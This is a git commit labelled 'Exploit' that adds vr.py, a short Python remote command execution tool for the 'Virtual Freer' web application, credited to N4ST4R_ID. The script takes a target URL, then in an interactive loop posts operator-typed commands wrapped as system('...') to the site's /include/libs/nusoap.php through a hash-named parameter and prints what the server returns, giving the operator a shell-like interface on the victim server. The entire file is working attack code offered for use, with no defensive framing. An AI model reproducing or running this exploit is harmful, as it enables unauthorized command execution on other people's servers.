3add04d3621fb26f4cf0c10fb728991fceb571d5
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2020-02-20 05:58:55 +0700

    Exploit

---
+++ vr.py
@@ -0,0 +1,28 @@
+#########                        #########
+# Virtual Freer Remote Command Execution #
+#           Coded By N4ST4R_ID           #
+#       https://www.NyamuXpl0it.cf       #
+#########                        #########                    
+
+import os
+import sys
+import requests
+
+os.system("clear")
+wab = sys.argv[1]
+web = wab+"/include/libs/nusoap.php"
+
+while True:
+  try:
+    cmd = input("[!] Command: ")
+    com = "system('%s');" % (cmd)
+    post = {
+      'a74ad8dfacd4f985eb3977517615ce25': com
+    }
+    r = requests.post(web, data = post)
+    if(r):
+      print(r.text)
+    else:
+      sys.exit("[-] Error..")
+  except KeyboardInterrupt:
+    sys.exit("[*] Closing..")
